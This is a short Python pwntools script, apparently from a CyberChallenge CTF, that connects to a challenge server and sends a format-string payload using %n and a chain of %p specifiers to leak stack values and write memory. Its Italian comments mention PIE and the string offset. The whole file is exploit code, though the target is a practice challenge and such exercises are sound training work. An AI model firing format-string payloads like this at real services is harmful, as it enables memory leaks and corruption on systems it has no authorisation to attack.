#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

def start(argv=[], *a, **kw):
    return remote("accesscode.jeopardy.cyberchallenge.it", 4022, *a, **kw)

#String format con PIE
io = start()

#Stringa iniziale in pos 10
string = b"%65x %1$n %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p"

#for i in range(17):
#    string += b"%p "

io.sendline(string)

io.interactive()

